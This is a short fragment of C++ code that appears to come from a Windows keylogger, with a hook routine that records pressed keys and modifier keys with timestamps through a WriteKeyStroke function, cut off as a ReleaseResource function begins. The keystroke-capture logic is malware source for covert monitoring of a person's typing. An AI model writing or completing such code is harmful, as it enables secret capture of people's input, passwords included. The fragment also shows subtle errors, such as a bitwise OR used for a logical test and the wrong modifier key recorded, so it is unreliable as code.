        if (wParam == 0x20 | wParam == 0x28 | wParam == 0x29 | wParam == 0x2A) {
            // Capture the keystroke
            WriteKeyStroke("Key: ", time(nullptr));
            WriteKeyStroke(char(wParam), time(nullptr));
        }
        // Check for modifier keys
        if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU) {
            WriteKeyStroke("Modifier: ", time(nullptr));
            WriteKeyStroke(char(VK_SHIFT), time(nullptr));
            WriteKeyStroke(char(wParam), time(nullptr));
        }
    }
}

void ReleaseResource(int hhook) {
